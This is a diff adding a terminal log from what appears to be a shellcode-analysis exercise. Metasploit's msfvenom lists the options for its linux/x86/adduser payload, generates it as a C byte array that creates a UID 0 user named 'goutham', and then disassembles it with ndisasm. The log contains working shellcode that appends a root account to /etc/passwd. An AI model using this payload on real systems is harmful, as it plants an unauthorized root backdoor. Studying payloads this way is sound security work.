@@ -1,0 +1,114 @@
+
+
+root@kali:~# msfvenom -p linux/x86/adduser --payload-options
+Options for payload/linux/x86/adduser:
+
+
+       Name: Linux Add User
+     Module: payload/linux/x86/adduser
+   Platform: Linux
+       Arch: x86
+Needs Admin: Yes
+ Total size: 97
+       Rank: Normal
+
+Provided by:
+    skape <mmiller@hick.org>
+    vlad902 <vlad902@gmail.com>
+    spoonm <spoonm@no$email.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+PASS   metasploit       yes       The password for this user
+SHELL  /bin/sh          no        The shell for this user
+USER   metasploit       yes       The username to create
+
+Description:
+  Create a new user with UID 0
+
+
+Advanced options for payload/linux/x86/adduser:
+
+    Name                Current Setting  Required  Description
+    ----                ---------------  --------  -----------
+    AppendExit          false            no        Append a stub that executes the exit(0) system call
+    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
+    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
+    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
+    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
+    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
+    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
+    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
+    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
+    VERBOSE             false            no        Enable detailed status messages
+    WORKSPACE                            no        Specify the workspace for this module
+Evasion options for payload/linux/x86/adduser:
+
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+root@kali:~# msfvenom -p linux/x86/adduser USER=goutham PASS=goutham -f c
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 94 bytes
+Final size of c file: 421 bytes
+unsigned char buf[] = 
+"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
+"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
+"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x25\x00\x00\x00\x67\x6f"
+"\x75\x74\x68\x61\x6d\x3a\x41\x7a\x51\x79\x45\x50\x75\x4e\x30"
+"\x65\x33\x79\x55\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69"
+"\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a"
+"\x01\x58\xcd\x80";
+root@kali:~# msfvenom -p linux/x86/adduser USER=goutham PASS=goutham -f raw | ndisasm -u -
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 94 bytes
+
+00000000  31C9              xor ecx,ecx
+00000002  89CB              mov ebx,ecx
+00000004  6A46              push byte +0x46
+00000006  58                pop eax
+00000007  CD80              int 0x80
+00000009  6A05              push byte +0x5
+0000000B  58                pop eax
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373
+00000014  682F2F7061        push dword 0x61702f2f
+00000019  682F657463        push dword 0x6374652f
+0000001E  89E3              mov ebx,esp
+00000020  41                inc ecx
+00000021  B504              mov ch,0x4
+00000023  CD80              int 0x80
+00000025  93                xchg eax,ebx
+00000026  E825000000        call 0x50
+0000002B  676F              a16 outsd
+0000002D  7574              jnz 0xa3
+0000002F  68616D3A41        push dword 0x413a6d61
+00000034  7A51              jpe 0x87
+00000036  7945              jns 0x7d
+00000038  50                push eax
+00000039  754E              jnz 0x89
+0000003B  306533            xor [ebp+0x33],ah
+0000003E  7955              jns 0x95
+00000040  3A30              cmp dh,[eax]
+00000042  3A30              cmp dh,[eax]
+00000044  3A3A              cmp bh,[edx]
+00000046  2F                das
+00000047  3A2F              cmp ch,[edi]
+00000049  62696E            bound ebp,[ecx+0x6e]
+0000004C  2F                das
+0000004D  7368              jnc 0xb7
+0000004F  0A598B            or bl,[ecx-0x75]
+00000052  51                push ecx
+00000053  FC                cld
+00000054  6A04              push byte +0x4
+00000056  58                pop eax
+00000057  CD80              int 0x80
+00000059  6A01              push byte +0x1
+0000005B  58                pop eax
+0000005C  CD80              int 0x80
+root@kali:~# 
